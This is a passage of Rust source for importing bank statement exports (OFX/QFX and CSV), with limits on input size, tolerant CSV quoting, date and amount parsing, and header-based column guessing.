//! Reading a bank's export: OFX/QFX (what "Download to Quicken" gives) and
//! CSV (what everything else gives). Pure: text in, lines out. The fixtures
//! the tests below read are in `tests/fixtures/money/`.
//!
//! # OFX
//!
//! Both dialects, by one reader. OFX 1.x is SGML, where a value's element is
//! never closed (`<NAME>WHOLE FOODS` and then the next tag), and is as often
//! written on one line as on many; OFX 2.x is XML, where it is. Both are read
//! as a run of tags, each with whatever text follows it up to the next `<`:
//! a closing tag is then only a marker, and an unclosed one costs nothing.
//! Every `<STMTTRN>` becomes a line -- `DTPOSTED`'s first eight digits as
//! the day, `TRNAMT` as the amount (already signed the way `Txn::amount` is:
//! negative is money out), `FITID` as the file's own id, `NAME` (else the
//! `PAYEE` aggregate's name, else the memo) as the payee and `MEMO` as the
//! description. `CURDEF` says what the amounts are counted in. A file
//! holding several accounts' statements has only the first read, and says
//! so: the lines go into one account, and two accounts' lines in one would
//! count every transfer between them twice.
//!
//! # CSV
//!
//! RFC 4180 quoting -- a quoted cell may hold the delimiter, a doubled quote
//! and a line break -- with the delimiter (comma, semicolon or tab) worked
//! out from the first lines, and a byte-order mark dropped. [`guess_mapping`]
//! finds the date, amount (or money-out and money-in), payee and
//! description columns by their header names, looking past a few lines of a
//! bank's preamble for the header; a file with no header at all is guessed
//! from what its columns hold. Dates may be ISO, `MM/DD/YYYY`, `DD/MM/YYYY`,
//! `M/D/YY`, `DD.MM.YYYY`, `YYYYMMDD` or `Mon D, YYYY`, with or without a
//! time after them; [`DateOrder::Auto`] reads slashed dates day-first when
//! any first field in the column is over twelve, and month-first otherwise.
//! Amounts go through [`parse_decimal`], which takes `(12.00)`, `$5`,
//! `1,234.56` and a trailing minus, and -- for the continental `1.234,56`
//! that it rightly refuses to guess at -- once more with the separators
//! swapped, only when the comma is plainly the decimal point.
//!
//! # What it will not do
//!
//! - **Read without limit.** More than [`MAX_BYTES`] of text, or more than
//!   [`MAX_LINES`] lines, is refused whole rather than read in part.
//! - **Fail over one line.** A line that cannot be read is a problem, named
//!   by its line number in the file (or its place among the file's
//!   transactions, for OFX), and the rest still arrive. At most
//!   [`MAX_PROBLEMS`] are reported, the last of them saying how many more
//!   there were.
//! - **Evaluate anything.** A cell that starts `=` is text, and stays the
//!   text it was; the export is where a spreadsheet would be at risk, and it
//!   is the export that neutralises it.
//! - **Keep what would only cause trouble.** Payees and descriptions have
//!   their runs of white space folded to one space and their control and
//!   invisible formatting characters (bidirectional overrides among them,
//!   which can make one payee read as another) dropped, and are cut at a
//!   length no bank line needs.

use jiff::civil::Date;
use karmayoga_core::money::text::{currency_code, is_invisible};
use karmayoga_core::money::{ImportedTxn, parse_decimal};
use serde::{Deserialize, Serialize};

/// Most text an import reads.
pub const MAX_BYTES: usize = 5 * 1024 * 1024;
/// Most lines an import reads.
pub const MAX_LINES: usize = 50_000;
/// Most columns a CSV row keeps; the rest of a wider row is dropped as it is
/// read. No bank's export comes near it, and without it a file of nothing but
/// commas -- millions of empty cells inside the size limit -- would arrive at
/// the preview as millions of columns for the window to draw.
pub const MAX_COLUMNS: usize = 64;
/// Most problems an import reports.
pub const MAX_PROBLEMS: usize = 20;

/// How many rows and lines a preview shows.
const SAMPLE: usize = 10;
/// How far down a file a header is looked for, past a bank's preamble.
const HEADER_SEARCH: usize = 10;
/// How many rows a guess from the content looks at.
const GUESS_ROWS: usize = 50;
/// Longest payee kept. Bank payees are a few dozen characters.
const MAX_PAYEE: usize = 200;
/// Longest description kept.
const MAX_DESCRIPTION: usize = 1000;
/// Longest file id kept. OFX allows 255.
const MAX_ID: usize = 255;
/// Longest cell a preview shows.
const PREVIEW_CELL: usize = 200;
/// Longest piece of a bad cell quoted back in a problem.
const QUOTE_LIMIT: usize = 40;

#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
pub enum ImportFormat {
    Ofx,
    Csv,
}

/// Month-first or day-first, for slashed dates.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Default, Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
pub enum DateOrder {
    #[default]
    Auto,
    MonthFirst,
    DayFirst,
}

/// Which CSV column is which. Column indexes are 0-based.
#[derive(Debug, Clone, PartialEq, Eq, Default, Serialize, Deserialize)]
#[serde(rename_all = "camelCase", default)]
pub struct CsvMapping {
    pub date: usize,
    /// One signed amount column...
    #[serde(skip_serializing_if = "Option::is_none")]
    pub amount: Option<usize>,
    /// ...or a money-out column and a money-in column.
    #[serde(skip_serializing_if = "Option::is_none")]
    pub debit: Option<usize>,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub credit: Option<usize>,
    pub payee: usize,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub description: Option<usize>,
    /// The amount column counts money out as positive (as card statements
    /// often do): turn it round.
    pub negate: bool,
    pub has_header: bool,
    pub date_order: DateOrder,
}

/// What `preview_import` answers: enough for the interface to show the
/// first rows and let somebody fix the mapping before importing.
#[derive(Debug, Clone, PartialEq, Serialize)]
#[serde(rename_all = "camelCase")]
pub struct ImportPreview {
    pub format: ImportFormat,
    /// CSV only: the header cells, or `Column 1`... when there is none.
    pub columns: Vec<String>,
    /// CSV only: the first ten data rows, as text.
    pub rows: Vec<Vec<String>>,
    /// CSV only: the guessed mapping.
    #[serde(skip_serializing_if = "Option::is_none")]
    pub mapping: Option<CsvMapping>,
    /// The lines that would be imported with that mapping, the first ten.
    pub sample: Vec<ImportedTxn>,
    /// How many lines in all.
    pub lines: u32,
    /// The currency the file states (OFX `CURDEF`), if it does.
    #[serde(skip_serializing_if = "Option::is_none")]
    pub currency: Option<String>,
    pub problems: Vec<String>,
}

/// OFX if it looks like OFX (`OFXHEADER` or `<OFX>` near the start), else CSV.
pub fn detect(text: &str) -> ImportFormat {
    let head: String = text.chars().take(2000).collect::<String>().to_ascii_uppercase();
    if head.contains("OFXHEADER") || head.contains("<OFX>") {
        ImportFormat::Ofx
    } else {
        ImportFormat::Csv
    }
}

/// Refuse a file too big to read: more than [`MAX_BYTES`] of text, or more
/// than [`MAX_LINES`] lines -- for CSV its rows, header included, counted
/// with quoted line breaks left inside their cells; for OFX its
/// transactions, since an SGML file spends a line on every field. The
/// sentence is for a person.
///
/// Cheap -- one pass over the bytes, nothing kept -- so the command layer
/// calls it to answer `too_large` before any parsing, and each parser calls
/// it again so that nothing reaches one unchecked.
pub fn check_limits(text: &str, format: ImportFormat) -> Result<(), String> {
    if text.len() > MAX_BYTES {
        return Err(format!(
            "that file is larger than {} MB; export a shorter range of dates",
            MAX_BYTES / (1024 * 1024)
        ));
    }
    let (count, allowed) = match format {
        ImportFormat::Ofx => (count_ignoring_case(text, "<STMTTRN>"), MAX_LINES),
        // One more than the lines, for the header.
        ImportFormat::Csv => (count_csv_rows(text), MAX_LINES + 1),
    };
    if count > allowed {
        return Err(format!(
            "that file has more than {MAX_LINES} transactions; export a shorter range of dates"
        ));
    }
    Ok(())
}

/// `problems` cut to [`MAX_PROBLEMS`], the last saying how many more there
/// were -- for the command that adds the vault's own problems to a parser's.
pub fn cap_problems(problems: Vec<String>) -> Vec<String> {
    let mut capped = Problems::default();
    for problem in problems {
        capped.push(problem);
    }
    capped.finish()
}

// ---- OFX ------------------------------------------------------------------

/// Every transaction in an OFX/QFX file, with the file's currency and the
/// problems met. `currency` is the fallback when the file states none.
pub fn parse_ofx(text: &str, currency: &str) -> (Vec<ImportedTxn>, Option<String>, Vec<String>) {
    if let Err(why) = check_limits(text, ImportFormat::Ofx) {
        return (Vec::new(), None, vec![why]);
    }

    let mut statements = 0usize;
    let mut stated: Option<String> = None;
    let mut found: Vec<OfxFields> = Vec::new();
    let mut current: Option<OfxFields> = None;
    let mut in_payee = false;
    let mut left_out = 0usize;
    for element in ofx_elements(text) {
        if element.closing {
            match element.name.as_str() {
                // `</BANKTRANLIST>` closes the last one too, for an SGML
                // writer that never closed any.
                "STMTTRN" | "BANKTRANLIST" => {
                    found.extend(current.take());
                    in_payee = false;
                }
                "PAYEE" => in_payee = false,
                _ => {}
            }
            continue;
        }
        match element.name.as_str() {
            "STMTRS" | "CCSTMTRS" | "INVSTMTRS" => statements += 1,
            "CURDEF" if statements <= 1 && stated.is_none() => {
                stated = currency_code(&element.value)
            }
            "STMTTRN" => {
                found.extend(current.take());
                in_payee = false;
                if statements <= 1 {
                    current = Some(OfxFields::default());
                } else {
                    left_out += 1;
                }
            }
            "PAYEE" => in_payee = true,
            name => {
                let Some(fields) = current.as_mut() else { continue };
                let value = element.value;
                match name {
                    "DTPOSTED" => fields.posted = value,
                    "DTUSER" => fields.user_date = value,
                    "TRNAMT" => fields.amount = value,
                    "FITID" => fields.fitid = value,
                    "NAME" if in_payee => fields.payee_name = value,
                    "NAME" => fields.name = value,
                    "MEMO" => fields.memo = value,
                    "CHECKNUM" => fields.check = value,
                    _ => {}
                }
            }
        }
    }
    found.extend(current.take());

    let counted_in = stated.clone().unwrap_or_else(|| currency.trim().to_ascii_uppercase());
    let mut problems = Problems::default();
    if left_out > 0 {
        problems.push(format!(
            "this file holds statements for {statements} accounts; only the first account's \
             transactions were read, and {left_out} from the others were left out"
        ));
    }
    let mut lines = Vec::with_capacity(found.len());
    for (n, fields) in found.into_iter().enumerate() {
        match ofx_line(fields, &counted_in) {
            Ok(line) => lines.push(line),
            Err(why) => problems.push(format!("transaction {}: {why}", n + 1)),
        }
    }
    if lines.is_empty() && problems.is_empty() {
        problems.push("there are no transactions in this file".to_string());
    }
    (lines, stated, problems.finish())
}

/// One `<STMTTRN>`'s fields, as text, before anything is made of them.
#[derive(Default)]
struct OfxFields {
    posted: String,
    user_date: String,
    amount: String,
    fitid: String,
    name: String,
    payee_name: String,
    memo: String,
    check: String,
}

fn ofx_line(fields: OfxFields, currency: &str) -> Result<ImportedTxn, String> {
    let raw_date = if fields.posted.is_empty() { &fields.user_date } else { &fields.posted };
    if raw_date.is_empty() {
        return Err("no date".to_string());
    }
    let date = ofx_date(raw_date).ok_or_else(|| format!("not a date: {}", shown(raw_date)))?;
    if fields.amount.is_empty() {
        return Err("no amount".to_string());
    }
    let amount = amount_of(&fields.amount, currency)
        .ok_or_else(|| format!("not an amount: {}", shown(&fields.amount)))?;
    let named = if fields.name.is_empty() { &fields.payee_name } else { &fields.name };
    let mut payee = clean_text(named, MAX_PAYEE);
    let mut description = clean_text(&fields.memo, MAX_DESCRIPTION);
    if payee.is_empty() {
        if !description.is_empty() {
            payee = clip(&description, MAX_PAYEE);
            description.clear();
        } else if !fields.check.trim().is_empty() {
            payee = format!("Check {}", clean_text(&fields.check, 20));
        } else {
            return Err("no payee or description".to_string());
        }
    }
    Ok(ImportedTxn {
        date,
        amount,
        payee,
        description,
        provider_id: clean_text(&fields.fitid, MAX_ID),
    })
}

/// `YYYYMMDD`, then perhaps a time and a zone, which are dropped: the day
/// the bank says is the day.
fn ofx_date(raw: &str) -> Option<Date> {
    let digits: String = raw.chars().take(8).collect();
    if digits.len() != 8 || !digits.bytes().all(|b| b.is_ascii_digit()) {
        return None;
    }
    ymd(digits[..4].parse().ok()?, digits[4..6].parse().ok()?, digits[6..].parse().ok()?)
}

/// One tag, and the text after it up to the next tag.
struct Element {
    /// Upper case.
    name: String,
    closing: bool,
    /// Trimmed, entities decoded. Empty for a closing tag.
    value: String,
}

/// The tags of an OFX document, from `<OFX>` on -- so neither SGML's
/// `KEY:VALUE` header nor XML's declarations are ever read as content.
/// Processing instructions and comments are skipped; `<MEMO/>` is an empty
/// element, opened and closed.
fn ofx_elements(text: &str) -> Vec<Element> {
    let start = find_ignoring_case(text, "<OFX>").unwrap_or(0);
    let mut rest = &text[start..];
    let mut out = Vec::new();
    while let Some(lt) = rest.find('<') {
        let after = &rest[lt + 1..];
        let Some(gt) = after.find('>') else { break };
        let inside = after[..gt].trim();
        let tail = &after[gt + 1..];
        let next = tail.find('<').unwrap_or(tail.len());
        let raw_value = tail[..next].trim();
        rest = &tail[next..];
        if inside.starts_with('?') || inside.starts_with('!') {
            continue;
        }
        let (closing, body) = match inside.strip_prefix('/') {
            Some(body) => (true, body),
            None => (false, inside),
        };
        let empty = !closing && body.ends_with('/');
        let name = body
            .split(|c: char| c.is_whitespace() || c == '/')
            .next()
            .unwrap_or("")
            .to_ascii_uppercase();
        if name.is_empty() {
            continue;
        }
        let value = if closing || empty { String::new() } else { decode_entities(raw_value) };
        out.push(Element { name: name.clone(), closing, value });
        if empty {
            out.push(Element { name, closing: true, value: String::new() });
        }
    }
    out
}

/// `&amp;`, `&lt;`, `&gt;`, `&quot;`, `&apos;`, `&nbsp;` and numeric
/// references. Anything else that starts `&` is left as it was: SGML OFX
/// writers are not all careful to escape a bare ampersand.
fn decode_entities(text: &str) -> String {
    if !text.contains('&') {
        return text.to_string();
    }
    let mut out = String::with_capacity(text.len());
    let mut rest = text;
    while let Some(amp) = rest.find('&') {
        out.push_str(&rest[..amp]);
        let after = &rest[amp..];
        let semi = after.char_indices().take(12).find(|(_, c)| *c == ';').map(|(i, _)| i);
        if let Some(semi) = semi {
            let entity = &after[1..semi];
            let decoded = match entity {
                "amp" => Some('&'),
                "lt" => Some('<'),
                "gt" => Some('>'),
                "quot" => Some('"'),
                "apos" => Some('\''),
                "nbsp" => Some(' '),
                _ => {
                    if let Some(hex) =
                        entity.strip_prefix("#x").or_else(|| entity.strip_prefix("#X"))
                    {
                        u32::from_str_radix(hex, 16).ok().and_then(char::from_u32)
                    } else if let Some(dec) = entity.strip_prefix('#') {
                        dec.parse::<u32>().ok().and_then(char::from_u32)
                    } else {
                        None
                    }
                }
            };
            if let Some(c) = decoded {
                out.push(c);
                rest = &after[semi + 1..];
                continue;
            }
        }
        out.push('&');
        rest = &after[1..];
    }
    out.push_str(rest);
    out
}

// ---- CSV ------------------------------------------------------------------

/// Guess a mapping from the header (or, without one, from the first rows).
pub fn guess_mapping(text: &str) -> Option<CsvMapping> {
    let records = read_records(text, detect_delimiter(text), GUESS_ROWS + HEADER_SEARCH);
    if let Some(found) =
        records.iter().take(HEADER_SEARCH).find_map(|record| mapping_from_header(&record.cells))
    {
        return Some(found);
    }
    mapping_from_content(&records)
}

/// Every transaction in a CSV file under `mapping`, with the problems met.
pub fn parse_csv(
    text: &str,
    mapping: &CsvMapping,
    currency: &str,
) -> (Vec<ImportedTxn>, Vec<String>) {
    if let Err(why) = check_limits(text, ImportFormat::Csv) {
        return (Vec::new(), vec![why]);
    }
    // A column past the cap can hold nothing -- wider rows are cut as they
    // are read -- and an index somebody sent as `usize::MAX` must not reach
    // the arithmetic below.
    if widest(mapping) >= MAX_COLUMNS {
        return (Vec::new(), vec![format!("a file has at most {MAX_COLUMNS} columns")]);
    }
    if mapping.amount.is_none() && mapping.debit.is_none() && mapping.credit.is_none() {
        return (
            Vec::new(),
            vec![
                "choose the column that holds the amount, or the money out and money in columns"
                    .to_string(),
            ],
        );
    }
    let records = read_records(text, detect_delimiter(text), usize::MAX);
    let (_, data) = split_header(&records, mapping);
    let order = resolve_order(
        data.iter().filter_map(|r| r.cells.get(mapping.date).map(String::as_str)),
        mapping.date_order,
    );
    let mut problems = Problems::default();
    let mut lines = Vec::with_capacity(data.len());
    for record in data {
        match csv_line(record, mapping, order, currency) {
            Ok(line) => lines.push(line),
            Err(why) => problems.push(format!("line {}: {why}", record.line)),
        }
    }
    if lines.is_empty() && problems.is_empty() {
        problems.push("there are no transactions in this file".to_string());
    }
    (lines, problems.finish())
}

/// The preview for `text`, in `format` (detected when `None`), amounts
/// read in `currency`.
pub fn preview(text: &str, format: Option<ImportFormat>, currency: &str) -> ImportPreview {
    let format = format.unwrap_or_else(|| detect(text));
    let mut out = ImportPreview {
        format,
        columns: Vec::new(),
        rows: Vec::new(),
        mapping: None,
        sample: Vec::new(),
        lines: 0,
        currency: None,
        problems: Vec::new(),
    };
    if let Err(why) = check_limits(text, format) {
        out.problems.push(why);
        return out;
    }
    match format {
        ImportFormat::Ofx => {
            let (lines, stated, problems) = parse_ofx(text, currency);
            out.lines = count(lines.len());
            out.sample = lines.into_iter().take(SAMPLE).collect();
            out.currency = stated;
            out.problems = problems;
        }
        ImportFormat::Csv => {
            let records = read_records(text, detect_delimiter(text), usize::MAX);
            let mapping = guess_mapping(text);
            let (header, data) = match &mapping {
                Some(mapping) => split_header(&records, mapping),
                None => match records.first() {
                    Some(first) if looks_like_header(first) => (Some(first), &records[1..]),
                    _ => (None, &records[..]),
                },
            };
            let width = header
                .into_iter()
                .chain(data.iter().take(SAMPLE))
                .map(|r| r.cells.len())
                .max()
                .unwrap_or(0);
            out.columns = (0..width)
                .map(|i| {
                    header
                        .and_then(|h| h.cells.get(i))
                        .map(|c| clean_text(c, PREVIEW_CELL))
                        .filter(|c| !c.is_empty())
                        .unwrap_or_else(|| format!("Column {}", i + 1))
                })
                .collect();
            out.rows = data
                .iter()
                .take(SAMPLE)
                .map(|r| r.cells.iter().map(|c| clean_text(c, PREVIEW_CELL)).collect())
                .collect();
            match mapping {
                Some(mapping) => {
                    let (lines, problems) = parse_csv(text, &mapping, currency);
                    out.lines = count(lines.len());
                    out.sample = lines.into_iter().take(SAMPLE).collect();
                    out.problems = problems;
                    out.mapping = Some(mapping);
                }
                None => out.problems.push(
                    "could not tell which column is the date and which the amount; choose them"
                        .to_string(),
                ),
            }
        }
    }
    out
}

/// One row of a CSV file, and the line of the file it starts on.
struct Record {
    line: usize,
    cells: Vec<String>,
}

/// Up to `limit` rows of `text`, RFC 4180, blank rows left out.
///
/// Tolerant where files are careless: a line may end `\r\n`, `\n` or a bare
/// `\r`; a quote opening a cell after some spaces still opens it; a quote in
/// the middle of an unquoted cell is just a character; a quote never closed
/// takes the rest of the file into its cell rather than losing it.
fn read_records(text: &str, delimiter: char, limit: usize) -> Vec<Record> {
    let mut records = Vec::new();
    let mut cells: Vec<String> = Vec::new();
    let mut cell = String::new();
    let mut quoted = false;
    // Nothing but white space in this cell yet, so a quote would open it.
    let mut fresh = true;
    let mut line = 1usize;
    let mut start = 1usize;
    let mut chars = strip_bom(text).chars().peekable();
    while let Some(c) = chars.next() {
        if quoted {
            match c {
                '"' if chars.peek() == Some(&'"') => {
                    chars.next();
                    cell.push('"');
                }
                '"' => quoted = false,
                '\n' => {
                    line += 1;
                    cell.push('\n');
                }
                _ => cell.push(c),
            }
            continue;
        }
        if c == delimiter {
            push_cell(&mut cells, std::mem::take(&mut cell));
            fresh = true;
            continue;
        }
        match c {
            '"' if fresh => {
                quoted = true;
                fresh = false;
                cell.clear();
            }
            '\r' | '\n' => {
                if c == '\r' && chars.peek() == Some(&'\n') {
                    chars.next();
                }
                push_cell(&mut cells, std::mem::take(&mut cell));
                fresh = true;
                keep_record(&mut records, std::mem::take(&mut cells), start);
                line += 1;
                start = line;
                if records.len() >= limit {
                    return records;
                }
            }
            _ => {
                if !c.is_whitespace() {
                    fresh = false;
                }
                cell.push(c);
            }
        }
    }
    if !cell.is_empty() || !cells.is_empty() || quoted {
        push_cell(&mut cells, cell);
        keep_record(&mut records, cells, start);
    }
    records
}

/// Add a cell to a row, unless the row already has [`MAX_COLUMNS`].
fn push_cell(cells: &mut Vec<String>, cell: String) {
    if cells.len() < MAX_COLUMNS {
        cells.push(cell);
    }
}

fn keep_record(records: &mut Vec<Record>, cells: Vec<String>, line: usize) {
    if cells.iter().any(|c| !c.trim().is_empty()) {
        records.push(Record { line, cells });
    }
}

fn strip_bom(text: &str) -> &str {
    text.strip_prefix('\u{feff}').unwrap_or(text)
}

/// Comma, semicolon or tab: whichever appears most often outside quotes in
/// the first lines. A continental file writes `-42,17` with commas in its
/// amounts, so a single line could mislead; ten lines of four semicolons
/// each do not. A comma when nothing says otherwise.
fn detect_delimiter(text: &str) -> char {
    const CANDIDATES: [char; 3] = [',', ';', '\t'];
    let mut counts = [0usize; 3];
    let mut quoted = false;
    let mut lines = 0;
    let mut seen = false;
    for c in strip_bom(text).chars() {
        if c == '"' {
            quoted = !quoted;
            continue;
        }
        if quoted {
            continue;
        }
        if c == '\n' {
            if seen {
                lines += 1;
                if lines >= HEADER_SEARCH {
                    break;
                }
            }
            seen = false;
            continue;
        }
        if let Some(i) = CANDIDATES.iter().position(|d| *d == c) {
            counts[i] += 1;
        }
        if !c.is_whitespace() {
            seen = true;
        }
    }
    let best =
        counts.iter().enumerate().fold(0, |best, (i, n)| if *n > counts[best] { i } else { best });
    CANDIDATES[best]
}

/// Rows of a CSV file, header included and blank lines not, counted without
/// keeping any of them -- for [`check_limits`].
fn count_csv_rows(text: &str) -> usize {
    let mut quoted = false;
    let mut rows = 0;
    let mut in_row = false;
    for b in text.bytes() {
        match b {
            b'"' => {
                quoted = !quoted;
                in_row = true;
            }
            b'\n' if !quoted => {
                if in_row {
                    rows += 1;
                }
                in_row = false;
            }
            b'\r' | b' ' | b'\t' => {}
            _ => in_row = true,
        }
    }
    if in_row { rows + 1 } else { rows }
}

/// The header row (when the mapping says there is one) and the rows after
/// it. The header is the first of the first few rows that reads as one --
/// past a bank's preamble of account numbers and date ranges -- else the
/// first row wide enough to hold every mapped column, else the first row.
fn split_header<'a>(
    records: &'a [Record],
    mapping: &CsvMapping,
) -> (Option<&'a Record>, &'a [Record]) {
    if records.is_empty() || !mapping.has_header {
        return (None, records);
    }
    let needed = widest(mapping) + 1;
    let at = records
        .iter()
        .take(HEADER_SEARCH)
        .position(|r| mapping_from_header(&r.cells).is_some())
        .or_else(|| records.iter().take(HEADER_SEARCH).position(|r| r.cells.len() >= needed))
        .unwrap_or(0);
    (Some(&records[at]), &records[at + 1..])
}

/// The highest column a mapping reads.
fn widest(mapping: &CsvMapping) -> usize {
    [
        Some(mapping.date),
        mapping.amount,
        mapping.debit,
        mapping.credit,
        Some(mapping.payee),
        mapping.description,
    ]
    .into_iter()
    .flatten()
    .max()
    .unwrap_or(0)
}

/// A first row with no date and no amount in it is a header.
fn looks_like_header(record: &Record) -> bool {
    record.cells.iter().all(|c| !looks_like_date(c.trim()) && !looks_like_amount(c.trim()))
}

fn csv_line(
    record: &Record,
    mapping: &CsvMapping,
    order: DateOrder,
    currency: &str,
) -> Result<ImportedTxn, String> {
    let cell = |i: usize| record.cells.get(i).map(|c| c.trim()).unwrap_or("");

    let raw_date = cell(mapping.date);
    if raw_date.is_empty() {
        return Err("no date".to_string());
    }
    let date =
        parse_date(raw_date, order).ok_or_else(|| format!("not a date: {}", shown(raw_date)))?;

    let mut amount = match mapping.amount {
        Some(column) => {
            let raw = cell(column);
            if raw.is_empty() {
                return Err("no amount".to_string());
            }
            amount_of(raw, currency).ok_or_else(|| format!("not an amount: {}", shown(raw)))?
        }
        None => {
            // A money-out column is money out whatever sign a bank wrote
            // in it, and a money-in column money in: some write a
            // withdrawal as `42.17`, some as `-42.17`, and both mean the
            // same thing in a column called Withdrawals.
            let side = |column: Option<usize>| -> Result<Option<i64>, String> {
                let Some(column) = column else { return Ok(None) };
                let raw = cell(column);
                if raw.is_empty() {
                    return Ok(None);
                }
                amount_of(raw, currency)
                    .map(|minor| Some(minor.abs()))
                    .ok_or_else(|| format!("not an amount: {}", shown(raw)))
            };
            let (debit, credit) = (side(mapping.debit)?, side(mapping.credit)?);
            if debit.is_none() && credit.is_none() {
                return Err("no amount in either the money out or the money in column".to_string());
            }
            credit.unwrap_or(0) - debit.unwrap_or(0)
        }
    };
    if mapping.negate {
        amount = -amount;
    }

    let mut payee = clean_text(cell(mapping.payee), MAX_PAYEE);
    let mut description = match mapping.description {
        Some(column) if column != mapping.payee => clean_text(cell(column), MAX_DESCRIPTION),
        _ => String::new(),
    };
    if payee.is_empty() {
        if description.is_empty() {
            return Err("no payee or description".to_string());
        }
        payee = clip(&description, MAX_PAYEE);
        description.clear();
    }
    Ok(ImportedTxn { date, amount, payee, description, provider_id: String::new() })
}

// ---- guessing columns -----------------------------------------------------

/// A mapping read off a header row, if it names a date and an amount (or a
/// money-out and a money-in column).
fn mapping_from_header(cells: &[String]) -> Option<CsvMapping> {
    let names: Vec<String> = cells.iter().map(|c| normalize_header(c)).collect();
    let date = best(&names, date_score, &[])?;
    let mut taken = vec![date];
    let (amount, debit, credit) = match best(&names, amount_score, &taken) {
        Some(amount) => (Some(amount), None, None),
        None => {
            let debit = best(&names, debit_score, &taken)?;
            let credit = best(&names, credit_score, &[date, debit])?;
            (None, Some(debit), Some(credit))
        }
    };
    taken.extend(amount);
    taken.extend(debit);
    taken.extend(credit);
    // A payee column if there is one; otherwise the description is the
    // payee -- most banks put the merchant there -- and a memo, if any, is
    // the description.
    let payee = best(&names, payee_score, &taken)
        .or_else(|| best(&names, description_score, &taken))
        .or_else(|| (0..names.len()).find(|i| !taken.contains(i)))?;
    taken.push(payee);
    let description = best(&names, description_score, &taken);
    Some(CsvMapping {
        date,
        amount,
        debit,
        credit,
        payee,
        description,
        negate: false,
        has_header: true,
        date_order: DateOrder::Auto,
    })
}

/// A mapping for a file whose header (if it has one) names nothing
/// recognisable: the first column that is mostly dates, the first other
/// that is mostly amounts, and the wordiest of the rest as the payee.
fn mapping_from_content(records: &[Record]) -> Option<CsvMapping> {
    let rows = &records[..records.len().min(GUESS_ROWS)];
    let width = rows.iter().map(|r| r.cells.len()).max()?;
    let date = (0..width).find(|&i| mostly(rows, i, looks_like_date))?;
    let amount = (0..width).filter(|&i| i != date).find(|&i| mostly(rows, i, looks_like_amount))?;
    let mut payee: Option<(usize, usize)> = None;
    for i in (0..width).filter(|&i| i != date && i != amount) {
        let letters: usize =
            rows.iter().map(|r| cell_at(r, i).chars().filter(|c| c.is_alphabetic()).count()).sum();
        if letters > 0 && payee.is_none_or(|(_, most)| letters > most) {
            payee = Some((i, letters));
        }
    }
    let (payee, _) = payee?;
    let has_header = rows.first().is_some_and(|first| !looks_like_date(cell_at(first, date)));
    Some(CsvMapping {
        date,
        amount: Some(amount),
        debit: None,
        credit: None,
        payee,
        description: None,
        negate: false,
        has_header,
        date_order: DateOrder::Auto,
    })
}

/// Do more than half of `rows` pass `test` in `column`?
fn mostly(rows: &[Record], column: usize, test: fn(&str) -> bool) -> bool {
    let majority = rows.len() / 2 + 1;
    rows.iter().filter(|r| test(cell_at(r, column))).count() >= majority
}

/// One cell, trimmed, or `""` past the end of a short row.
fn cell_at(record: &Record, column: usize) -> &str {
    record.cells.get(column).map(|c| c.trim()).unwrap_or("")
}

/// Lower case, every run of anything but letters and digits one space:
/// `"Trans. Date"` → `"trans date"`, `"Betrag (€)"` → `"betrag"`.
fn normalize_header(cell: &str) -> String {
    let spaced: String = cell
        .trim()
        .to_lowercase()
        .chars()
        .map(|c| if c.is_alphanumeric() { c } else { ' ' })
        .collect();
    spaced.split_whitespace().collect::<Vec<_>>().join(" ")
}

fn has_word(header: &str, words: &[&str]) -> bool {
    header.split(' ').any(|w| words.contains(&w))
}

/// The leftmost of the columns not `taken` that scores highest, if any
/// scores at all.
fn best(names: &[String], score: fn(&str) -> u32, taken: &[usize]) -> Option<usize> {
    let mut found: Option<(usize, u32)> = None;
    for (i, name) in names.iter().enumerate() {
        if taken.contains(&i) {
            continue;
        }
        let s = score(name);
        if s > 0 && found.is_none_or(|(_, top)| s > top) {
            found = Some((i, s));
        }
    }
    found.map(|(i, _)| i)
}

fn date_score(h: &str) -> u32 {
    match h {
        "date" | "datum" | "fecha" => 10,
        "transaction date" | "trans date" | "txn date" | "date of transaction" => 9,
        "posted date" | "posting date" | "post date" | "posted" | "date posted"
        | "booking date" | "buchungstag" | "buchungsdatum" | "date operation"
        | "date opération" => 8,
        "value date" | "valuta" | "valutadatum" | "wertstellung" => 5,
        _ if has_word(h, &["date", "datum"]) || h.contains("datum") => 4,
        _ => 0,
    }
}

fn amount_score(h: &str) -> u32 {
    if has_word(h, &["balance", "saldo", "limit", "available", "kontostand"]) {
        return 0;
    }
    match h {
        "amount" | "betrag" | "importe" | "montant" | "bedrag" | "belopp" | "beløb" | "kwota" => {
            10
        }
        "transaction amount" | "amt" | "value" | "sum" => 8,
        _ if h.starts_with("amount") || h.starts_with("betrag") => 8,
        _ if has_word(h, &["original", "foreign"]) => 2,
        _ if has_word(h, &["amount", "betrag", "importe", "montant"]) => 6,
        _ => 0,
    }
}

fn debit_score(h: &str) -> u32 {
    // "Debit/Credit" is a column saying which, not an amount.
    if has_word(h, &["credit", "credits", "type", "indicator", "card", "limit", "balance"]) {
        return 0;
    }
    match h {
        "debit" | "debits" | "withdrawal" | "withdrawals" | "money out" | "paid out"
        | "outflow" | "out" | "debit amount" | "withdrawal amount" | "soll" | "charge"
        | "charges" | "spent" | "ausgang" => 10,
        _ if has_word(h, &["debit", "debits", "withdrawal", "withdrawals", "outflow"]) => 6,
        _ => 0,
    }
}

fn credit_score(h: &str) -> u32 {
    if has_word(h, &["debit", "debits", "type", "indicator", "card", "limit", "balance", "score"]) {
        return 0;
    }
    match h {
        "credit" | "credits" | "deposit" | "deposits" | "money in" | "paid in" | "inflow"
        | "in" | "credit amount" | "deposit amount" | "haben" | "received" | "eingang" => 10,
        _ if has_word(h, &["credit", "credits", "deposit", "deposits", "inflow"]) => 6,
        _ => 0,
    }
}

fn payee_score(h: &str) -> u32 {
    if has_word(
        h,
        &["account", "iban", "bic", "number", "no", "id", "konto", "kontonummer", "category"],
    ) {
        return 0;
    }
    match h {
        "payee"
        | "payee name"
        | "merchant"
        | "merchant name"
        | "name"
        | "counterparty"
        | "counter party"
        | "beneficiary"
        | "recipient"
        | "empfänger"
        | "zahlungsempfänger"
        | "auftraggeber empfänger"
        | "begünstigter zahlungspflichtiger"
        | "beguenstigter zahlungspflichtiger"
        | "name zahlungsbeteiligter"
        | "from to"
        | "to from" => 10,
        _ if [
            "payee",
            "merchant",
            "empfänger",
            "counterparty",
            "beneficiary",
            "zahlungspflichtige",
            "auftraggeber",
        ]
        .iter()
